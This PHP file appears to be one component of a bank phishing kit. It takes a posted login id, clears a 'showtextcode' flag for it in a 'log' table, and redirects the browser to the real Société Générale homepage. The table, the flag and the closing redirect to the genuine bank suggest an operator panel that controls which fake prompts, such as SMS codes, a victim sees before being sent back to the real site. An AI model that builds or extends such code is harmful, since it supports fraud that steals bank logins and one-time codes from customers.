<?php

include '../conn.php';
$id = isset($_POST['id']) ? $_POST['id'] : false;


$sql = "UPDATE log set  showtextcode = 0 WHERE login = :login";


$stmt = $pdo->prepare($sql);
$stmt->execute(array(
    ':login' => $id,
));


die("<script type='text/javascript'>top.location = 'http://societegenerale.fr/';</script>");



?>